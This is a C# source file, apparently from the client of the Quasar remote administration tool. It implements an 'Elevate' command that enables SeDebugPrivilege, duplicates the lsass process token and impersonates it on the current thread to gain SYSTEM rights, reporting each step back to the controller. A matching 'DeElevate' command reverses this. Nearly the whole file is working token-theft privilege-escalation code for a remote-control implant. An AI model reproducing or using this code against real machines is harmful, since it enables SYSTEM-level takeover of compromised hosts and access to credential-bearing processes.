using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Quasar.Client.Helper
{
    public class SystemElevation
    {
        private const uint TOKEN_ALL_ACCESS = 0x000F01FF;
        private const uint TOKEN_DUPLICATE = 0x00000002;
        private const uint TOKEN_QUERY = 0x00000004;
        private const int SE_PRIVILEGE_ENABLED = 0x2;

        [StructLayout(LayoutKind.Sequential)]
        public struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(
            IntPtr tokenHandle,
            bool disableAllPrivileges,
            ref TokPriv1Luid newState,
            int bufferLength,
            IntPtr previousState,
            IntPtr returnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DuplicateToken(IntPtr existingTokenHandle, int impersonationLevel, out IntPtr duplicateTokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool SetThreadToken(IntPtr thread, IntPtr token);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();

        public static void Elevate(ISender client)
        {
            if (!IsAdministrator())
            {
                Debug.WriteLine("Run the Command as an Administrator");
                client.Send(new SetStatus { Message = "Run the Command as an Administrator" });
                return;
            }

            if (!EnablePrivilege("SeDebugPrivilege"))
            {
                Debug.WriteLine("Failed to enable SeDebugPrivilege.");
                client.Send(new SetStatus { Message = "Failed to enable SeDebugPrivilege." });
                return;
            }

            if (!DuplicateAndSetToken())
            {
                Debug.WriteLine("Token duplication and impersonation failed.");
                client.Send(new SetStatus { Message = "Token duplication and impersonation failed." });
            }
            else
            {
                Debug.WriteLine("Token duplication and impersonation successful.");
                client.Send(new SetStatus { Message = "Token duplication and impersonation successful." });
            }
        }

        private static bool IsAdministrator()
        {
            WindowsPrincipal principal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static bool EnablePrivilege(string privilege)
        {
            if (!LookupPrivilegeValue(null, privilege, out long luid))
            {
                return false;
            }

            TokPriv1Luid tpLuid = new TokPriv1Luid
            {
                Count = 1,
                Luid = luid,
                Attr = SE_PRIVILEGE_ENABLED
            };

            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, out IntPtr hToken))
            {
                return false;
            }

            try
            {
                return AdjustTokenPrivileges(hToken, false, ref tpLuid, 0, IntPtr.Zero, IntPtr.Zero);
            }
            finally
            {
                CloseHandle(hToken);
            }
        }

        private static bool DuplicateAndSetToken()
        {
            Process lsass = Process.GetProcessesByName("lsass")[0];
            if (!OpenProcessToken(lsass.Handle, TOKEN_DUPLICATE | TOKEN_QUERY, out IntPtr hLsassToken))
            {
                return false;
            }

            try
            {
                if (!DuplicateToken(hLsassToken, 2, out IntPtr duplicateTokenHandle))
                {
                    return false;
                }

                try
                {
                    return SetThreadToken(IntPtr.Zero, duplicateTokenHandle);
                }
                finally
                {
                    CloseHandle(duplicateTokenHandle);
                }
            }
            finally
            {
                CloseHandle(hLsassToken);
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);
        public static void DeElevate(ISender client)
        {
            if (!IsAdministrator())
            {
                Debug.WriteLine("Run the Command as an Administrator");
                client.Send(new SetStatus { Message = "Run the Command as an Administrator" });
                return;
            }

            if (!DisablePrivilege("SeDebugPrivilege"))
            {
                Debug.WriteLine("Failed to disable SeDebugPrivilege.");
                client.Send(new SetStatus { Message = "Failed to disable SeDebugPrivilege." });
                return;
            }

            if (!RevertToSelf())
            {
                Debug.WriteLine("Failed to revert to self.");
                client.Send(new SetStatus { Message = "Failed to revert to self." });
            }
            else
            {
                Debug.WriteLine("Reverted to self successfully.");
                client.Send(new SetStatus { Message = "Reverted to self successfully." });
            }
        }

        private static bool DisablePrivilege(string privilege)
        {
            if (!LookupPrivilegeValue(null, privilege, out long luid))
            {
                return false;
            }

            TokPriv1Luid tpLuid = new TokPriv1Luid
            {
                Count = 1,
                Luid = luid,
                Attr = 0 // Disable the privilege
            };

            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, out IntPtr hToken))
            {
                return false;
            }

            try
            {
                return AdjustTokenPrivileges(hToken, false, ref tpLuid, 0, IntPtr.Zero, IntPtr.Zero);
            }
            finally
            {
                CloseHandle(hToken);
            }
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool RevertToSelf();
    }
}